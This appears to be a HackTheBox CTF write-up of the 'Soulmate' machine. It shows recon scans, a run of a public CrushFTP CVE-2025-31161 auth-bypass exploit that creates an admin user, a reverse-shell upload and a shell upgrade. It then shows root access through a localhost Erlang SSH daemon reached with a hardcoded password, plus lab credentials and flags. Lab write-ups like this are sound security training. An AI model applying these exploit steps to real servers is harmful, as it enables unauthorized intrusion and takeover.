---
title: "Soulmate"
date: 2025-10-12 00:00 +0800
categories: [Boot2Root]
tags: [HTB,Easy,Boot2Root,CrushFTP,CVE-2025-31161,Auth Bypass,Admin Panel,Reverse Shell,Privilege Escalation,Erlang SSH]
image: https://github.com/user-attachments/assets/b5b67bf0-e932-4491-b8ef-646eb7c7e668
---

Exploited a CrushFTP auth-bypass to create an admin user, uploaded a web shell to get www-data, discovered credentials in an Erlang start script, SSHed to the local Erlang daemon on 127.0.0.1:2222, dropped into an Erlang shell and used os:cmd(...) to run commands as root and retrieve the flag.

## Recon

nmap scan result:
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Soulmate]
└─$ cat nmap-scan.txt 
# Nmap 7.95 scan initiated Sun Oct 12 19:10:59 2025 as: /usr/lib/nmap/nmap --privileged -sCV -oN nmap-scan.txt -p- -vv 10.10.11.86
Nmap scan report for soulmate.htb (10.10.11.86)
Host is up, received echo-reply ttl 63 (0.011s latency).
Scanned at 2025-10-12 19:10:59 +08 for 19s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Soulmate - Find Your Perfect Match
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 12 19:11:18 2025 -- 1 IP address (1 host up) scanned in 19.45 seconds
```

In the first reconnaissance phase we searched for known exploits using **searchsploit** based on the Nmap results, but found nothing useful.

Because there were no valid credentials or obvious SSH exploits, we focused on the web service on **port 80**. 

Then we did manual checks of the site. Meanwhile we run **dirsearch** for any unusual directories but nothing much after further review. Here is the scan results:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Soulmate]
└─$ dirsearch -u soulmate.htb                                                                                                    
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                 
 (_||| _) (/_(_|| (_| )                                                                                                          
                                                                                                                                 
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/HTB/Soulmate/reports/_soulmate.htb/_25-10-12_21-27-59.txt

Target: http://soulmate.htb/

[21:27:59] Starting:                                                                                                             
[21:28:07] 301 -  178B  - /assets  ->  http://soulmate.htb/assets/          
[21:28:07] 403 -  564B  - /assets/                                          
[21:28:10] 302 -    0B  - /dashboard.php  ->  /login                        
[21:28:14] 200 -    8KB - /login.php                                        
[21:28:14] 302 -    0B  - /logout.php  ->  login.php                        
[21:28:19] 302 -    0B  - /profile.php  ->  /login                          
[21:28:19] 200 -   11KB - /register.php                                     
                                                                             
Task Completed                                                                                                                   
```

Here is the screenshots of the web application, And found ``register.php`` and ``login.php``. We required to register as new user and logged in to learn it further functionalities.

<img width="1506" height="860" alt="image" src="https://github.com/user-attachments/assets/767ac483-373c-49e6-afab-ef599c8be8b7" />

<img width="1414" height="839" alt="image" src="https://github.com/user-attachments/assets/cc14b989-eb2b-4cd4-8fd7-5e3789ec81f6" />

<img width="1713" height="840" alt="image" src="https://github.com/user-attachments/assets/955e3fac-9ad7-4a76-852c-fed103ebbdd9" />

## Initial Enumeration

from the **Contact Us** section we find that the email used was ``hello@soulmate.htb``. So enumerate the subdomain.

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Soulmate]
└─$ gobuster vhost -u soulmate.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://soulmate.htb
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
ftp.soulmate.htb Status: 302 [Size: 0] [--> /WebInterface/login.html]
Progress: 4989 / 4989 (100.00%)
===============================================================
Finished
===============================================================
```

It redirected us to ``http://ftp.soulmate.htb/WebInterface/login.html``

Meanwhile i was doing manual checks, again we got nothing from our directory enumerate tools. I did tried some of those common creds for CrushFTP, but still nothing.

Then, we found CrushFTP version from the source code *(I wasn't actually sure is this the correct version for this web)* but still look for ``CrushFTP Versions 11.W.657`` through [duckduckgo](https://duckduckgo.com/) search engine cause normally [google](https://google.com/) wont return exploits as results.

<img width="1063" height="387" alt="image" src="https://github.com/user-attachments/assets/7005c7cc-3acd-4981-a5da-f85c7cdbb2c4" />

## Auth Bypass

### CVE-2025-31161 exploit

It straight forward gave us known CVE's for CrushFTP version **< 10.8.4, < 11.3.1** 

<img width="809" height="419" alt="image" src="https://github.com/user-attachments/assets/a01a54cb-8870-4d0b-9d1b-306e63a7ae65" />

Look for its POC for a review, then locate it from my own kali. 

<img width="1252" height="761" alt="image" src="https://github.com/user-attachments/assets/c38afcaf-d7cf-44db-9e67-dde753dd1a87" />

<img width="1012" height="821" alt="image" src="https://github.com/user-attachments/assets/21070de8-0b2a-44d5-bf99-83da263cd43a" />

Actually i spent quite some time here because the tools is quite broken. 

Ran the same commands for 2 times but one not working and suddenly the next time, it work just fine..

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Soulmate]
└─$ python 52295.py --target ftp.soulmate.htb --port 80 --exploit --target-user root --new-user wekwek --password wekwek123!       

[36m
  / ____/______  _______/ /_  / ____/ /_____
 / /   / ___/ / / / ___/ __ \/ /_  / __/ __ \
/ /___/ /  / /_/ (__  ) / / / __/ / /_/ /_/ /
\____/_/   \__,_/____/_/ /_/_/    \__/ .___/
                                    /_/
[32mCVE-2025-31161 Exploit 2.0.0[33m | [36m Developer @ibrahimsql
[0m

Exploiting 1 targets with 10 threads...
[+] Successfully created user wekwek on ftp.soulmate.htb
Exploiting targets... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% (1/1) 0:00:00

Exploitation complete! Successfully exploited 1/1 targets.

Exploited Targets:
→ ftp.soulmate.htb

Summary:
Total targets: 1
Vulnerable targets: 0
Exploited targets: 1
```

### Admin Panel Logged In

Logged in with the new username and password -> Admin -> User manager -> ben -> Generate Random Password *(change to any password you prefer)* -> Use this -> Ok -> Save

<img width="1710" height="382" alt="image" src="https://github.com/user-attachments/assets/869918d7-068d-43a6-bc2d-d722883ba84f" />

<img width="1721" height="774" alt="image" src="https://github.com/user-attachments/assets/16d609d7-fb2b-41af-9741-1bf0c357671e" />

<img width="1706" height="838" alt="image" src="https://github.com/user-attachments/assets/b0a205f7-9df4-4dd0-909d-b2195a04417a" />

**Relogged** in as **ben** with password *(because from ben user's stuff he's the one had full read and write access for http://soulmate.htb)*

<img width="1717" height="684" alt="image" src="https://github.com/user-attachments/assets/3a73ca3b-324d-4c7e-83bd-b7cfe57f61ba" />

## Shell as www-data

Then we can upload our revshell inside the folder 

<img width="1721" height="892" alt="image" src="https://github.com/user-attachments/assets/4d4b249f-d683-4b15-833e-1a739e1e59a2" />

<img width="1354" height="778" alt="image" src="https://github.com/user-attachments/assets/cff680ef-3d82-4bd0-8bd1-d95d6c0198ad" />


and a little shell upgrade

```bash
script /dev/null -c bash
# CTRL + Z
stty raw -echo;fg;
export TERM=xterm
```

<img width="1705" height="891" alt="image" src="https://github.com/user-attachments/assets/52200bf1-796a-42e5-89b6-a4500ff51719" />

I ran the usual local-privilege checks and noticed an unusual root process *(an Erlang escript that starts an Erlang-based SSH daemon)*. 

### Script that exposes erlang ssh  

The script runs as root and exposes an SSH-like interface. 

<img width="1714" height="830" alt="image" src="https://github.com/user-attachments/assets/86eb7a91-7dd8-4c2a-a83b-d2d3709acbe3" />

It contains a hardcoded ben password, which is a direct local privilege-escalation vector. 

Anyone able to reach the localhost SSH (or execute ssh ben@127.0.0.1 from a local account) can authenticate, drop into the Erlang shell, and execute commands as root.

```bash
www-data@soulmate:/$ cat /usr/local/lib/erlang_login/start.escript
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
www-data@soulmate:/$ 
```

## Shell as ben

<img width="1319" height="873" alt="image" src="https://github.com/user-attachments/assets/8a30b566-57c4-4f1e-aeb9-942bae700107" />

```bash
ben@soulmate:/$ cat /home/ben/user.txt 
4c0de71d51aa06b345df3723fb74xxxx
```

### Erlang local SSH Shell confirmation

We found an SSH service listening on 127.0.0.1:2222. Connecting showed an Erlang SSH shell. 

Logging in gave an Erlang prompt. From that prompt we ran id and confirmed that we had **root** access

```bash
ben@soulmate:/$ ss -tuln
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
udp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*          
tcp   LISTEN 0      128        127.0.0.1:39503      0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:9090       0.0.0.0:*          
tcp   LISTEN 0      5          127.0.0.1:2222       0.0.0.0:*          
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:8443       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:4369       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:8080       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:36839      0.0.0.0:*          
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*          
tcp   LISTEN 0      4096           [::1]:4369          [::]:*          
tcp   LISTEN 0      128             [::]:22            [::]:*          
tcp   LISTEN 0      511             [::]:80            [::]:*          

ben@soulmate:/$ nc 127.0.0.1 2222
SSH-2.0-Erlang/5.2.9
^C
```

## Shell as root

### Connecting to localhost port 2222 (Erlang SSH Shell)

```
ben@soulmate:/$ ssh ben@127.0.0.1 -p 2222
ben@127.0.0.1's password: 
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1> os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
(ssh_runner@soulmate)3> os:cmd("cat /root/root.txt").
"851506a3c8a1cedc8f340d21xxxxxxx7\n"
(ssh_runner@soulmate)4> 
```

[Badge](https://labs.hackthebox.com/achievement/machine/1737187/721)
